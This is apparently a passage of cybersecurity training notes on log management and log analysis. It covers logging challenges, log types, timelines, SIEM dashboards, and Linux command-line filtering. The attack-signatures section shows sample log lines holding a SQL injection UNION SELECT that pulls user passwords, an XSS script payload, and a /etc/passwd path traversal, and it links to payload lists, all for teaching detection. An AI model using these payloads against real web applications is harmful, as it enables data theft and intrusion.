| **Continuous Change** | • Logging sources, types, and messages are constantly changing and being updated.
    ◦ Be open to continuous change.
• Train your personnel. |

# Challenges

Challenges
 are as much a part of log management as principles. However, most of 
them can be addressed in the planning section. The table below 
highlights the main challenges of logging.

| **Data Volumeand Noise** | • Having multiple data sources to deal with.
• Differences in the log volumes created by applications.
    ◦ Some applications generate an insufficient amount of logs.
    ◦ Large-scale applicants could generate massive log volumes.
• Some logs can provide non-essential data and make the identifying process difficult. |
| --- | --- |
| **System Performanceand Collection** | • Log collection can slow down the system's performance.
• Systems are not always "state of the art".
    ◦ Some "sensitive" or "ancient" systems are impossible to touch.
• Deployment and optimisation challenges.
    ◦ Managing system and agent version updates and synchronisation in large-scale networks is overwhelming. |
| **Process and Archive** | • Having multiple data formats to deal with it.
    ◦ Parsing different data sources and formats is time-consuming and error-prone.
• Balancing the log retention can be challenging.
    ◦ Especially when dealing with many compliance regulations and standards. |
| **Security** | • Ensuring data security is a task/challenge in itself. |
| **Analysis** | • Combining,
 correlating, and analysing data from multiple sources to understand the
 context of an incident is a time-consuming process that requires 
significant computing resources and expertise.
    ◦ Achieving this in real-time is also another challenge in the same scope.
    ◦ Avoiding false positives/negatives is overwhelming. |
| **Misc** | • Lack of planning and roadmap.
• Lack of financial resources/budget.
• Lack of implementation scenarios, playbooks, and exercises.
• Lack of technical skills to implement, maintain, and analyse.
• Focusing on log collection instead of the analysis phase.
• Ignoring human factors and potential system errors. |

# Where To Go From Here?

The
 mentioned principles and challenges are common and can vary according 
to your case. However, the main point is adhering to logging principles 
and proactively addressing challenges.

**Common Mistakes and Best Practices**

# Common Mistakes and Best Practices

Logging
 is a powerful and valuable tool for cyber security and IT operations. 
But harnessing this power and maximising it takes solid planning and 
implementation. Otherwise, logging will become inefficient, making 
things difficult to do, tedious to manage, and draining resources.

In
 addition to the high and low-level details, strategies and suggestions 
discussed until this point, a few more things require your attention. 
Logging is a continuous and live operation which needs continuous 
maintenance and improvement. Therefore, the infamous "if it works, don't
 touch it!" approach is unacceptable. The threats and computing 
technologies evolve and change; therefore, you must update your 
configurations and adapt the changes accordingly. Implementing the 
following actions is a good place to start the self-assessment and 
improvement process.

- Learn from mistakes and failures.
- Track the sectoral threat dynamics for the operated sector and conduct regular scope and resilience testing.
- Follow the best practices of industry leaders and experts.

If
 you ever think about how important to re-configure, update, or test 
your existing logging configurations is, please consider the following 
real-life experience faced by millions of people worldwide.

| **Experience** | • Log analysis nightmare due to improper log configurations and/or lack of configuration maintenance/updates. |
| --- | --- |
| **Storyline** | • MS
 Windows 7 Operation System default logging configurations provided zero
 and/or insufficient logs when the system is compromised with the 
EternalBlue vulnerability (CVE-2017-0144) exploit.
• No significant event logs were created under System, Security, and Application logs. |
| **Attack Details** | • **Damage: Full access to the victim system.**
• **Impact:** High
• **Score:** NIST NVD Score (CVSS 3)= 8.1 High. |
| **Notes** | • MS Windows 7 SP1's official support date ends in 2020.
• The exploit was discovered and used in the wild in 2017. |

# Common Mistakes and Best Practices

First,
 you should use consultancy services if you are short on time and need a
 solution that directly fits your systems. Tailored-up solutions require
 comprehensive risk assessment practices, as highlighted in the previous
 tasks. However, avoiding some known pain points and deadlock cases is 
possible by considering the "dos" and "don'ts" in the planning and 
implementation steps. Therefore, the main point of this section is 
understanding "what does work" and "what doesn't".

| **Mistakes"don'ts"** | Best Practices"dos" |
| --- | --- |
| • Logging sensitive information!
• Creating logs by yourself.
• Having uncollected logs.
• Collecting everything but not analysing.
• Collecting logs without proper planning and configuration.
• Having systems that lack the planned/required log configuration.
• Skipping the scale, testing, and functionality analysis.
• Focusing on edges and skipping the internal systems in analysis.
• "Searching for what you want to find" and "Not investigating what you see".
• Forgetting that the process takes the form of proper planning, management, and analysis. | • Create a suitable log configuration and plan according to your systems.
• Implement testing on scale, functionality, and operational stability.
• Exclude logging sensitive information!
• Secure your logs.
• Create meaningful alerts/notifications.
• Focus on having insights on actionable and impactful results.
• Train your analysts and enhance their skills.
• Update/maintain your operation plans and components/assets as needed. |

Log Analysis Basics

Among the various data 
sources collected and utilized by infrastructure systems, logs are 
pivotal in offering valuable insights into these systems' inner workings
 and interactions across the network. A log is a stream of 
time-sequenced messages that record occurring events. Log analysis is 
the process of making sense of the events captured in the logs to paint a
 clear picture of what has happened across the infrastructure.

# What Are Logs?

Logs are recorded events or transactions within a system, device, or 
application. Specifically, these events can be related to application 
errors, system faults, audited user actions, resource uses, network 
connections, and more. Each log entry contains relevant details to 
contextualize the event, such as its timestamp (the date and time it 
occurred), the source (the system that generated the log), and 
additional information about the specific log event.

sample.log

```
Jul 28 17:45:02 10.10.0.4 FW-1: %WARNING% general: Unusual network activity detected from IP 10.10.0.15 to IP 203.0.113.25. Source Zone: Internal, Destination Zone: External, Application: web-browsing, Action: Alert.
```

In the above example, this log entry signifies an event detected by a
 firewall regarding unusual network activity from an internal system, 
indicating a potential security concern. The relevant fields to consider
 in this example are:

`Jul 28 17:45:02` - This timestamp shows the event's date and time.

`10.10.0.4` - This refers to the system's IP address (the source) that generated the log.

`%WARNING%` - This indicates the severity of the log, in this case, **Warning**.
 Log entries are often given a severity level to categorize and 
communicate their relative importance or impact. These severity levels 
help prioritize responses, investigations, and actions based on the 
criticality of the events. Different systems might use slightly 
different severity levels, but commonly, you can expect to find the 
following increasing severity levels: Informational, Warning, Error, and
 Critical.

`Action: Alert` - In this case, the firewall's policy was configured to notify when such unusual activity occurs.

The remaining fields give us specific information related to the 
logged event. Specifically, that unusual network activity was detected *from* IP 10.10.0.15 *to* IP 203.0.113.25. Based on the `Source Zone` field,  the traffic appears destined for the Internet (**External**), and the **Application** was categorized as **web-browsing**.

# Why Are Logs Important?

There are several reasons why collecting logs and adopting an 
effective log analysis strategy is vital for an organization's ongoing 
operations. Some of the most common activities include:

- **System Troubleshooting**: Analyzing system errors and warning logs helps IT teams understand and quickly respond to system
failures, minimizing downtime, and improving overall system reliability.
- **Cyber Security Incidents:** In the security context, logs are crucial in detecting and responding to security incidents. Firewall logs, intrusion detection system (IDS) logs, and system authentication
logs, for example, contain vital information about potential threats and suspicious activities. Performing log analysis helps SOC teams and
Security Analysts identify and quickly respond to unauthorized access
attempts, malware, data breaches, and other malicious activities.
- **Threat Hunting:** On the proactive side, cyber
security teams can use collected logs to actively search for advanced
threats that may have evaded traditional security measures. Security
Analysts and Threat Hunters can analyze logs to look for unusual
patterns, anomalies, and indicators of compromise (IOCs) that might
indicate the presence of a threat actor.
- **Compliance:** Organizations must often maintain detailed records of their system's activities for regulatory and
compliance purposes. Regular log analysis ensures that organizations can provide accurate reports and demonstrate compliance with regulations
such as GDPR, HIPAA, or PCI DSS.

# Types of Logs

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/8fcc12257924c815f446db76bb38bf10.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/8fcc12257924c815f446db76bb38bf10.svg)

As discussed in the [Intro to Logs](https://tryhackme.com/room/introtologs) room,
 different components within a computing environment generate various 
types of logs, each serving a distinct purpose. These log types include,
 but are not limited to:

- **Application Logs:** Messages from specific applications, providing insights into their status, errors, warnings, and other operational details.
- **Audit Logs:** Events, actions, and changes occurring within a system or application, providing a history of user activities and
system behavior.
- **Security Logs:** Security-related events like logins, permission alterations, firewall activities, and other actions impacting system security.
- **Server Logs:** System logs, event logs, error logs, and access logs, each offering distinct information about server operations.
- **System Logs:** Kernel activities, system errors, boot sequences, and hardware status, aiding in diagnosing system issues.
- **Network Logs:** Communication and activity within a network, capturing information about events, connections, and data transfers.
- **Database Logs:** Activities within a database system, such as queries performed, actions, and updates.
- **Web Server Logs:** Requests processed by web servers, including URLs, source IP addresses, request types, response codes, and more.

Each log type presents a unique perspective on the activities within 
an environment, and analyzing these logs in context to one another is 
crucial for effective cyber security investigation and threat detection.

Investigation Theory

Several methodologies, 
best practices, and essential techniques are employed to create a 
coherent timeline and conduct effective log analysis investigations.

# Timeline

When conducting log analysis, creating a timeline is a fundamental 
aspect of understanding the sequence of events within systems, devices, 
and applications. At a high level, a timeline is a chronological 
representation of the logged events, ordered based on their occurrence. 
The ability to visualize a timeline is a powerful tool for 
contextualizing and comprehending the events that occurred over a 
specific period.

Within incident response scenarios, timelines play a crucial role in 
reconstructing security incidents. With an effective timeline, security 
analysts can trace the sequence of events leading up to an incident, 
allowing them to identify the initial point of compromise and understand
 the attacker's tactics, techniques and procedures (TTPs).

# Timestamp

In most cases, logs will typically include timestamps that record 
when an event occurred. With the potential of many distributed devices, 
applications, and systems generating individual log events across 
various regions, it's crucial to consider each log's time zone and 
format. Converting timestamps to a consistent time zone is necessary for
 accurate log analysis and correlation across different log sources.

Many log monitoring solutions solve this issue through timezone detection and automatic configuration. [Splunk](https://docs.splunk.com/Documentation/Splunk/9.1.0/Search/Abouttimezones),
 for example, automatically detects and processes time zones when data 
is indexed and searched. Regardless of how time is specified in 
individual log events, timestamps are converted to UNIX time and stored 
in the `_time` field when indexed.

This consistent timestamp can then be converted to a local timezone 
during visualization, which makes reporting and analysis more efficient.
 This strategy ensures that analysts can conduct accurate investigations
 and gain valuable insights from their log data without manual 
intervention.

# Super Timelines

A super timeline, also known as a consolidated timeline, is a 
powerful concept in log analysis and digital forensics. Super timelines 
provide a comprehensive view of events across different systems, 
devices, and applications, allowing analysts to understand the sequence 
of events holistically. This is particularly useful for investigating 
security incidents involving multiple components or systems.

Super timelines often include data from previously discussed log 
sources, such as system logs, application logs, network traffic logs, 
firewall logs, and more. By combining these disparate sources into a 
single timeline, analysts can identify correlations and patterns that 
need to be apparent when analyzing logs individually.

Creating a consolidated timeline with all this information manually 
would take time and effort. Not only would you have to record timestamps
 for every file on the system, but you would also need to understand the
 data storage methods of every application. Fortunately, [Plaso (Python Log2Timeline)](https://github.com/log2timeline/plaso)
 is an open-source tool created by Kristinn Gudjonsson and many 
contributors that automates the creation of timelines from various log 
sources. It's specifically designed for digital forensics and log 
analysis and can parse and process log data from a wide range of sources
 to create a unified, chronological timeline.

To learn more about Plaso and its capabilities, visit the [official documentation page here](https://plaso.readthedocs.io/en/latest/).

# Data Visualization

Data visualization tools, such as Kibana
 (of the Elastic Stack) and Splunk, help to convert raw log data into 
interactive and insightful visual representations through a user 
interface. Tools like these enable security analysts to understand the 
indexed data by visualizing patterns and anomalies, often in a graphical
 view. Multiple visualizations, metrics, and graphic elements can be 
constructed into a tailored dashboard view, allowing for a comprehensive
 "single pane of glass" view for log analysis operations.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/caeace06b70e4c6920d32ae0bf22e8f4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/caeace06b70e4c6920d32ae0bf22e8f4.png)

To create effective log visualizations, it's essential first to 
understand the data (and sources) being collected and define clear 
objectives for visualization.

For example, suppose the objective is to monitor and detect patterns 
of increased failed login attempts. In that case, we should look to 
visualize logs that audit login attempts from an authentication server 
or user device. A good solution would be to create a line chart that 
displays the trend of failed login attempts over time. To manage the 
density of captured data, we can filter the visualization to show the 
past seven days. That would give us a good starting point to visualize 
increased failed attempts and spot anomalies.

# Log Monitoring and Alerting

In addition to visualization, implementing effective log monitoring and alerting allows security teams to *proactively* identify threats and immediately respond when an alert is generated.

Many SIEM
 solutions (like Splunk and the Elastic Stack) allow the creation of 
custom alerts based on metrics obtained in log events. Events worth 
creating alerts for may include multiple failed login attempts, 
privilege escalation, access to sensitive files, or other indicators of 
potential security breaches. Alerts ensure that security teams are 
promptly notified of suspicious activities that require immediate 
attention.

Roles and responsibilities should be defined for escalation and 
notification procedures during various stages of the incident response 
process. Escalation procedures ensure that incidents are addressed 
promptly and that the right personnel are informed at each severity 
level.

For a hands-on walkthrough on dashboards and alerting within Splunk, it is recommended to check out the [Splunk: Dashboards and Reports](https://tryhackme.com/jr/splunkdashboardsandreports) room!

# External Research and Threat Intel

Identifying what may be of interest to us in log analysis is 
essential. It is challenging to analyze a log if we're not entirely sure
 what we are looking for.

First, let's understand what threat intelligence is. In summary, 
threat intelligence are pieces of information that can be attributed to a
 malicious actor. Examples of threat intelligence include:

- IP Addresses
- File Hashes
- Domains

When analyzing a log file, we can search for the presence of threat 
intelligence. For example, take this Apache2 web server entry below. We 
can see that an IP address has tried to access our site's admin panel.

Outputting an Apache2  Access Log

```
cmnatic@thm cat access.log
54.36.149.64 - - [25/Aug/2023:00:05:36 +0000] "GET /admin HTTP/1.1" 200 8260 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
191.96.106.80 - - [25/Aug/2023:00:33:11 +0000] "GET /TryHackMe/rooms/docker-rodeo/dockerregistry/catalog1.png HTTP/1.1" 200 19594 "https://tryhackme.com/" "Mozi>
54.36.148.244 - - [25/Aug/2023:00:34:46 +0000] "GET /TryHackMe/?C=D;O=D HTTP/1.1" 200 5879 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot>
66.249.66.68 - - [25/Aug/2023:00:35:53 +0000] "GET /TryHackMe%20Designs/ HTTP/1.1" 200 5973 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) 200 19594 "https://tryhackme.com/" "Mozi>
```

Using a threat intelligence feed like [ThreatFox](https://threatfox.abuse.ch/), we can search our log files for known malicious actors' presence.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/c3ad6571c689577d907026d8a75d73c7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/c3ad6571c689577d907026d8a75d73c7.png)

Using GREP to search a logfile for an IP address

```
cmnatic@thm grep "54.36.149.64" logfile.txt
54.36.149.64
```

Detection Engineering

# Common Log File Locations

A crucial aspect of log analysis is understanding where to locate log
 files generated by various applications and systems. While log file 
paths can vary due to system configurations, software versions, and 
custom settings, knowing common log file locations is essential for 
efficient investigation and threat detection.

- **Web Servers:**
    - **Nginx:**
        - Access Logs: `/var/log/nginx/access.log`
        - Error Logs: `/var/log/nginx/error.log`
    - **Apache:**
        - Access Logs: `/var/log/apache2/access.log`
        - Error Logs: `/var/log/apache2/error.log`
- **Databases:**
    - **MySQL:**
        - Error Logs: `/var/log/mysql/error.log`
    - **PostgreSQL:**
        - Error and Activity Logs: `/var/log/postgresql/postgresql-{version}-main.log`
- **Web Applications:**
    - **PHP:**
        - Error Logs: `/var/log/php/error.log`
- **Operating Systems:**
    - **Linux:**
        - General System Logs: `/var/log/syslog`
        - Authentication Logs: `/var/log/auth.log`
- **Firewalls and IDS/IPS:**
    - **iptables:**
        - Firewall Logs: `/var/log/iptables.log`
    - **Snort:**
        - Snort Logs: `/var/log/snort/`

While these are common log file paths, it's important to note that 
actual paths may differ based on system configurations, software 
versions, and custom settings. It's recommended to consult the official 
documentation or configuration files to verify the correct log file 
paths to ensure accurate analysis and investigation.

# Common Patterns

In a security context, recognizing common patterns and trends in log 
data is crucial for identifying potential security threats. These 
"patterns" refer to the identifiable artifacts left behind in logs by 
threat actors or cyber security incidents. Fortunately, there are some 
common patterns that, if learned, will improve your detection abilities 
and allow you to respond efficiently to incidents.

**Abnormal User Behavior**

One of the primary patterns that can be identified is related to 
unusual or anomalous user behavior. This refers to any actions or 
activities conducted by users that deviate from their typical or 
expected behavior.

To effectively detect anomalous user behavior, organizations can 
employ log analysis solutions that incorporate detection engines and 
machine learning algorithms to establish normal behavior patterns. 
Deviations from these patterns or baselines can then be alerted as 
potential security incidents. Some examples of these solutions include [*Splunk User Behavior Analytics (UBA)*](https://www.splunk.com/en_us/products/user-behavior-analytics.html), [*IBM QRadar UBA*](https://www.ibm.com/docs/en/qradar-common?topic=app-qradar-user-behavior-analytics), and [*Azure AD Identity Protection*](https://learn.microsoft.com/en-us/azure/active-directory/identity-protection/overview-identity-protection).

The specific indicators can vary greatly depending on the source, but
 some examples of this that can be found in log files include:

- **Multiple failed login attempts**
    - Unusually high numbers of failed logins within a short time may indicate a brute-force attack.
- **Unusual login times**
    - Login events outside the user's typical access hours or patterns might signal unauthorized access or compromised accounts.
- **Geographic anomalies**
    - Login events from IP addresses in countries the user does not
    usually access can indicate potential account compromise or suspicious
    activity.
    - In addition, simultaneous logins from different
    geographic locations (or indications of impossible travel) may suggest
    account sharing or unauthorized access.
- **Frequent password changes**
    - Log events indicating that a user's password has been changed
    frequently in a short period may suggest an attempt to hide unauthorized access or take over an account.
- **Unusual user-agent strings**
    - In the context of HTTP traffic logs, requests from users with uncommon user-agent strings that deviate from their typical browser may indicate automated attacks or
    malicious activities.
    - For example, by default, the [Nmap scanner](https://tryhackme.com/room/furthernmap) will log a user agent containing "Nmap Scripting Engine." The [Hydra brute-forcing tool](https://tryhackme.com/room/hydra), by default, will include "(Hydra)" in its user-agent. These indicators
    can be useful in log files to detect potential malicious activity.

The significance of these anomalies can vary greatly depending on the
 specific context and the systems in place, so it is essential to 
fine-tune any automated anomaly detection mechanisms to minimize false 
positives.

# Common Attack Signatures

Identifying common attack signatures in log data is an 
effective way to detect and quickly respond to threats. Attack 
signatures contain specific patterns or characteristics left behind by 
threat actors. They can include malware infections, web-based attacks (SQL
 injection, cross-site scripting, directory traversal), and more. As 
this is entirely dependent on the attack surface, some high-level 
examples include:

# SQL

SQL
 injection attempts to exploit vulnerabilities in web applications that 
interact with databases. Look for unusual or malformed SQL queries in 
the application or database logs to identify common SQL injection attack
 patterns.

Suspicious SQL queries might contain unexpected characters, such as single quotes (`'`), comments (`--`, `#`), union statements (`UNION`), or time-based attacks (`WAITFOR DELAY`, `SLEEP()`). A useful SQLi payload list to reference can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).

In the below example, an SQL injection attempt can be identified by the `' UNION SELECT` section of the `q=` query parameter. The attacker appears to have escaped the SQL query with the single quote and injected a union select statement to retrieve information from the `users`
 table in the database. Often, this payload may be URL-encoded, 
requiring an additional processing step to identify it efficiently.

sqli.log

```
10.10.61.21 - - [2023-08-02 15:27:42] "GET /products.php?q=books' UNION SELECT null, null, username, password, null FROM users-- HTTP/1.1" 200 3122
```

# Cross-Site Scripting ()

Exploiting cross-site scripting (XSS)
 vulnerabilities allow attackers to inject malicious scripts into web 
pages. To identify common XSS attack patterns, it is often helpful to 
look for log entries with unexpected or unusual input that includes 
script tags (`<script>`) and event handlers (`onmouseover`, `onclick`, `onerror`). A useful XSS payload list to reference can be found [here](https://github.com/payloadbox/xss-payload-list).

In the example below, a cross-site scripting attempt can be identified by the `<script>alert(1);</script>` payload inserted into the `search` parameter, which is a common testing method for XSS vulnerabilities.

xss.log

```
10.10.19.31 - - [2023-08-04 16:12:11] "GET /products.php?search=<script>alert(1);</script> HTTP/1.1" 200 5153
```

# Path Traversal

Exploiting path traversal vulnerabilities allows attackers to access 
files and directories outside a web application's intended directory 
structure, leading to unauthorized access to sensitive files or code. To
 identify common traversal attack patterns, look for traversal sequence 
characters (`../` and `../../`) and indications of access to sensitive files (`/etc/passwd`, `/etc/shadow`). A useful directory traversal payload list to reference can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).

It is important to note, like with the above examples, that directory
 traversals are often URL encoded (or double URL encoded) to avoid 
detection by firewalls or monitoring tools. Because of this, `%2E` and `%2F` are useful URL-encoded characters to know as they refer to the `.` and `/` respectively.

In the below example, a directory traversal attempt can be identified by the repeated sequence of `../` characters, indicating that the attacker is attempting to "back out" of the web directory and access the sensitive `/etc/passwd` file on the server.

path-traversal.log

```
10.10.113.45 - - [2023-08-05 18:17:25] "GET /../../../../../etc/passwd HTTP/1.1" 200 505
```

Automated vs. Manual Analysis

# Automated Analysis

Automated analysis involves the use of tools. For example, these 
often include commercial tools such as XPLG or SolarWinds Loggly. 
Automated analysis tools allow for processing and data analysis of logs.
 These tools often utilize Artificial Intelligence / Machine Learning to
 analyze patterns and trends. As the AI landscape evolves, we expect to 
see more effective automated analysis solutions.

| **Advantages** | **Disadvantages** |
| --- | --- |
| Saves time by performing a lot of the manual work required in manual analysis | Automated analysis tools are usually commercial-only and, therefore, expensive. |
| The use of artificial intelligence is effective at recognizing patterns and trends. | The effectiveness of artificial intelligence depends on how
 capable the model is. For example, the risk of false positives 
increases, or newer or never-seen-before events can be missed as the AI 
is not trained to recognize these. |

# Manual Analysis

Manual analysis is the process of examining data and artifacts 
without using automation tools. For example, an analyst scrolling 
through a web server log would be considered manual analysis. Manual 
analysis is essential for an analyst because automation tools cannot be 
relied upon.

| **Advantages** | **Disadvantages** |
| --- | --- |
| It is cheap and does not require expensive tooling. For example, simple Linux commands can do the trick. | It is time-consuming as the analyst has to do all of the work, including reformatting log files. |
| Allows for a thorough investigation. | N/A |
| Reduces the risk of overfitting or false positives on alerts from automated tools. | Events or alerts can be missed! Especially if there is a lot of data to comb through. |
| Allows for contextual analysis. The analyst has a broader understanding of the organization and cyber security landscape. | N/A |

Log Analysis Tools: Command Line

When
 analyzing collected logs, sometimes the most readily available tool we 
have is the command line itself. Analyzing logs through the command line
 provides a quick and powerful way to gain insights into system 
activities, troubleshoot issues, and detect security incidents, even if 
we don't have an SIEM system configured.

Many built-in Linux
 commands allow us to parse and filter relevant information quickly. 
Viewing log files using the command line is one of the most basic yet 
essential tasks for conducting log analysis. Several common built-in 
tools are used for this purpose, offering differing functionalities to 
read and navigate through log files efficiently.

You can locate the `apache.log` file on the AttackBox under `/root/Rooms/introloganalysis/task6` to follow along with this task. However, it is also attached to this task and available for download.

# cat

The `cat` command (short for "concatenate") is a simple 
utility that reads one or more files and displays its content in the 
terminal. When used for log files, it prints the entire log content to 
the screen.

For example, to view the contents of a log file named `apache.log`, you can use the command:

cat Example

```
user@tryhackme$ cat apache.log        203.0.113.42 - - [31/Jul/2023:12:34:56 +0000] "GET /index.php HTTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
120.54.86.23 - - [31/Jul/2023:12:34:57 +0000] "GET /contact.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
185.76.230.45 - - [31/Jul/2023:12:34:58 +0000] "GET /about.php HTTP/1.1" 200 9876 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
201.39.104.77 - - [31/Jul/2023:12:34:59 +0000] "GET /login.php HTTP/1.1" 200 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
...
...
```

Due to its large output, it is typically not the best approach for dealing with long log files.

# less

The `less` command is an improvement over `cat`
 when dealing with larger files. It allows you to view the file's data 
page by page, providing a more convenient way to read through lengthy 
logs. When using `less` to open a file, it displays the first page by default, and you can scroll down using the arrow keys or with *Page Up* and *Page Down*.

For example, to view the same log file using `less`, use the command:

less Example

```
user@tryhackme$ less apache.log       ...
...
HTTP/1.1" 200 7890 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.350 Safari/5>
P/1.1" 404 4321 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.3>
TTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.90 Safari/537>
P/1.1" 200 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.3>
TTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537>
P/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.3>
TP/1.1" 200 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.90 Safari/537.>
~
~
~
~
(END)
```

You can exit the command's output via the `q` key.

# tail

The `tail` command is specifically designed for viewing 
the end of files and is very useful for seeing a summary of recently 
generated events in the case of log files. The most common use of `tail` is coupled with the `-f`
 option, which allows you to "follow" the log file in real-time, as it 
continuously updates the terminal with new log entries as they are 
generated and written. This is extremely useful when monitoring logs for
 live events or real-time system behavior.

By default, `tail` will only display the last ten lines of the file. However, we can change this with the `-n` option and specify the number of lines we want to view.

For example, if we only wanted to print the last five lines of the `apache.log` file and "follow" the logs in real-time, we can use the command:

tail Example

```
user@tryhackme$ tail -f -n 5 apache.log176.145.201.99 - - [31/Jul/2023:12:34:24 +0000] "GET /login.php HTTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.90 Safari/537.36"
104.76.29.88 - - [31/Jul/2023:12:34:23 +0000] "GET /index.php HTTP/1.1" 200 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
128.45.76.66 - - [31/Jul/2023:12:34:22 +0000] "GET /contact.php HTTP/1.1" 404 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
76.89.54.221 - - [31/Jul/2023:12:34:21 +0000] "GET /about.php HTTP/1.1" 200 1234 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36"
145.76.33.201 - - [31/Jul/2023:12:34:20 +0000] "GET /login.php HTTP/1.1" 200 5678 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.90 Safari/537.36"
```

Being able to sort, filter, and manipulate log files from the command
 line is a crucial aspect of performing effective log analysis. Analysts
 often need to extract specific information, filter out relevant data, 
aggregate results, and transform logs to uncover insights and identify 
anomalies.

**Note:** The opposite of the `tail` command is `head`, which allows you to view the *first* ten lines of a file by default and takes in the same arguments. Feel free to experiment with this as well!

# wc

The `wc` (word count) command is a simple but powerful 
utility that can be quite useful for quick analysis and statistics 
gathering. The output of `wc` provides information about the 
number of lines, words, and characters in a log file. This can help 
security analysts understand the size and volume of log data they are 
dealing with before diving into a more detailed analysis.

wc Example

```
user@tryhackme$ wc apache.log        70  1562 14305 apache.log
```

After running `wc` on `apache.log`, we can determine that the file contains **70** lines, **1562** individual words (separated by whitespace), and **14305** individual characters.

# cut

The `cut` command extracts specific columns (fields) from 
files based on specified delimiters. This is a handy command for working
 with log files that have structured or tab-separated data.

If we want to extract all of the IP addresses in the file, we can use the `cut` command to specify a delimiter of a `space` character and only select the first field returned.

cut Example

```
user@tryhackme$ cut -d ' ' -f 1 apache.log203.0.113.42
120.54.86.23
185.76.230.45
201.39.104.77
112.76.89.56
211.87.186.35
156.98.34.12
202.176.73.99
122.65.187.55
77.188.103.244
189.76.230.44
153.47.106.221
200.89.134.22
...
...
```

The above command will return a list of every IP address in the log file. Expanding on this, we can change the field number to `-f 7` to extract the URLs and `-f 9` to extract the HTTP status codes.

# sort

Sometimes, it's helpful to sort the returned entries chronologically or alphabetically. The `sort`
 command arranges the data in files in ascending or descending order 
based on specific criteria. This can be crucial for identifying 
patterns, trends, or outliers in our log data. It is also common to 
combine the *output* of another command (cut, for example) and use it as the *input* of the sort command using the pipe `|` redirection character.

For example, to sort the list of returned IP addresses from the above `cut` command, we can run:

sort Example

```
user@tryhackme$ cut -d ' ' -f 1 apache.log | sort -n76.89.54.221
76.89.54.221
76.89.54.221
76.89.54.221
76.89.54.221
76.89.54.221
77.188.103.244
99.76.122.65
104.76.29.88
104.76.29.88
104.76.29.88
104.76.29.88
104.76.29.88
104.76.29.88
...
...
```

In the above command, we piped the output from `cut` into the `sort` command and added the `-n` option to sort *numerically*. This changed the output to list the IP addresses in ascending order.

If we want to reverse the order, we can add the `-r` option:

sort Example (Reversed)

```
user@tryhackme$ cut -d ' ' -f 1 apache.log | sort -n -r221.90.64.76
211.87.186.35
203.78.122.88
203.64.78.90
203.64.78.90
203.64.78.90
203.64.78.90
203.64.78.90
203.64.78.90
203.0.113.42
202.176.73.99
201.39.104.77
200.89.134.22
...
...
```

# uniq

The `uniq` command identifies and removes adjacent 
duplicate lines from sorted input. In the context of log analysis, this 
can be a useful tool for simplifying data lists (like collected IP 
addresses), especially when log entries may contain repeated or 
redundant information. The `uniq` command is often combined with the `sort` command to **sort** the data before removing the duplicate entries.

For example, the output of the `sort` command we ran above
 contains a few duplicate IP addresses, which is easier to spot when the
 data is sorted numerically. To remove these repeatedly extracted IPs 
from the list, we can run:

uniq Example

```
user@tryhackme$ cut -d ' ' -f 1 apache.log | sort -n -r | uniq221.90.64.76
211.87.186.35
203.78.122.88
203.64.78.90
203.0.113.42
202.176.73.99
201.39.104.77
200.89.134.22
192.168.45.99
...
...
```

We can also append the `-c` option to output unique lines 
and prepend the count of occurrences for each line. This can be very 
useful for quickly determining IP addresses with unusually high traffic.

uniq Example (with count)

```
user@tryhackme$ cut -d ' ' -f 1 apache.log | sort -n -r | uniq -c      1 221.90.64.76
      1 211.87.186.35
      1 203.78.122.88
      6 203.64.78.90
      1 203.0.113.42
